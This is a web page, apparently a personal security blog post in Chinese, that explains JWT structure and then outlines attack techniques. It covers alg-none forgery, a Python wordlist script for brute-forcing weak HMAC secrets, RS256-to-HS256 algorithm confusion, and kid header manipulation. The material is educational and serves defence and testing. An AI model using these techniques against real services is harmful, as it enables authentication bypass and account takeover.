@@ -1,0 +1,88 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>JWT | Hurn's Blog</title><meta name="description" content="JWT - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">JWT</h1><div class="post-info"><a></a>2022-06-17</div><div class="post-content"><h1 id="0x1-JWT概念"><a href="#0x1-JWT概念" class="headerlink" title="0x1. JWT概念"></a>0x1. JWT概念</h1><p>JWT（Json Web Token），是一种非常流行的跨域认证方式，在传统的cookie/session认证种，无法做到一个Token在公司的不同网站之间认证，所以需要用到JWT这种认证方式。JWT通常包括三部分：Header（头部）、Payload（负载）和Signature（签名）。</p>
+<blockquote>
+<p> 格式： Header.Payload.Signature </p>
+</blockquote>
+<ul>
+<li>Header标识用来生成签名的算法：</li>
+</ul>
+<pre><code class="txt">header = &#39;&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#39;
+</code></pre>
+<p><code>HS256</code>表示此令牌是使用 HMAC-SHA256 签名的。</p>
+<ul>
+<li><p>Payload有效负载，也是一个 JSON 对象，用来存放实际需要传递的数据，一般是用来存放标识用户身份的数据。除了JWT 规定了7个官方字段，还可以自定以字段。</p>
+<p>7个官方字段：</p>
+<pre><code class="txt">iss (issuer)：签发人
+exp (expiration time)：过期时间
+sub (subject)：主题
+aud (audience)：受众
+nbf (Not Before)：生效时间
+iat (Issued At)：签发时间
+jti (JWT ID)：编号
+</code></pre>
+<p>可以自定义字段：</p>
+<pre><code class="txt">&#123;
+  &quot;id&quot;: &quot;1234567890&quot;,
+  &quot;name&quot;: &quot;Zhang San&quot;,
+  &quot;rule&quot;: &quot;admin&quot;
+&#125;
+</code></pre>
+</li>
+<li><p>Signature 部分是对前两部分的签名，防止数据篡改。首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
+<pre><code class="txt">key = &#39;secretkey&#39;
+unsignedToken = encodeBase64(header) + &#39;.&#39; + encodeBase64(payload)
+signature = HMAC-SHA256(key, unsignedToken)
+</code></pre>
+</li>
+</ul>
+<p>最后通过base64URL算法进行链接：</p>
+<pre><code class="txt">token = encodeBase64(header) + &#39;.&#39; + encodeBase64(payload) + &#39;.&#39; + encodeBase64(signature)
+
+# 例如： 
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI
+</code></pre>
+<h1 id="0x2-JWT攻击方式"><a href="#0x2-JWT攻击方式" class="headerlink" title="0x2. JWT攻击方式"></a>0x2. JWT攻击方式</h1><h2 id="0x2-1-签名算法为None"><a href="#0x2-1-签名算法为None" class="headerlink" title="0x2.1 签名算法为None"></a>0x2.1 签名算法为None</h2><p>如果将header的签名算法设置为None，说明后端服务未对签名 signature 做校验，故可直接篡改<strong>载荷 payload</strong> 内容，并可一并删除 singature 签名字段来尝试绕过签名校验</p>
+<pre><code class="python">import jwt
+
+print(jwt.encode(&#123;&quot;xxx&quot;:&quot;xxx&quot;&#125;, key=&quot;&quot;, algorithm=&quot;none&quot;))
+</code></pre>
+<h2 id="0x2-2-弱密钥暴力破解"><a href="#0x2-2-弱密钥暴力破解" class="headerlink" title="0x2.2 弱密钥暴力破解"></a>0x2.2 弱密钥暴力破解</h2><p>当 alg 值为 HMAC 类对称加密算法时，在签名中会使用一个密钥进行HMAC加密，可以针对密钥进行暴力破解</p>
+<pre><code class="python">import jwt
+
+#jwt_str= eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU
+def runblasting(path,jwt_str,alg):
+    if alg == &quot;none&quot;:
+        alg = &quot;HS256&quot;
+    with open(path,encoding=&#39;utf-8&#39;) as f:
+        for line in f:
+            key_ = line.strip()
+            try:
+                jwt.decode(jwt_str,verify=True,key=key_,algorithm=alg)
+                print(&#39;found key! --&gt; &#39; +  key_)
+                break
+            except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
+                print(&#39;found key! --&gt; &#39; +  key_)
+                break
+            except(jwt.exceptions.InvalidSignatureError):
+                continue
+        else:
+            print(&quot;key not found!&quot;)
+</code></pre>
+<h2 id="0x2-3-非对称加密算法转对称加密算法"><a href="#0x2-3-非对称加密算法转对称加密算法" class="headerlink" title="0x2.3 非对称加密算法转对称加密算法"></a>0x2.3 非对称加密算法转对称加密算法</h2><p>当 header 头部指定签名算法为 RSA 非对称加密算法时，可以替换为 HMAC 对称加密算法，并且如果能获取到公钥重新做签名，服务器在签名校验时便可能会使用公钥做校验，这样就可能会绕过算法的限制。</p>
+<p>当 server 端严格指定只允许使用 HMAC 或者 RSA 算法其中一种时候，那这种攻击手段是没有效果的。</p>
+<h2 id="0x2-4-kid-指定攻击"><a href="#0x2-4-kid-指定攻击" class="headerlink" title="0x2.4 kid 指定攻击"></a>0x2.4 kid 指定攻击</h2><p>kid 即为 key ID ，存在于 jwt header 中，是一个可选的字段，用来指定加密算法的密钥</p>
+<pre><code class="txt">&#123;
+    &quot;alg&quot;: &quot;HS256&quot;,
+    &quot;typ&quot;: &quot;JWT&quot;,
+    &quot;kid&quot;: &quot;xxx&quot;
+&#125;
+</code></pre>
+<pre><code class="python">import jwt
+
+jwt.encode(&#123;&quot;xxx&quot;:&quot;xxx&quot;&#125;,key=&quot;xxx&quot;,algorithm=&#39;HS256&#39;,headers=&#123;&quot;kid&quot;:&quot;xxx&quot;&#125;)
+</code></pre>
+<p>若服务器并未对 header 头部做限制，那么程序将会按照 header 中指定的密钥进行校验，从而通过签名校验</p>
+<p>另外如果这个 kid 参数，在服务端用来读取密钥可能会还会有一些任意文件读取、SQL注入、命令注入等问题。</p>
+<h1 id="0x3-参考"><a href="#0x3-参考" class="headerlink" title="0x3. 参考"></a>0x3. 参考</h1><p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/14361834.html">https://www.cnblogs.com/wjrblogs/p/14361834.html</a></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/06/20/Java/XXE/">prev</a><a class="next" href="/2022/06/14/Java/SpringBootCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
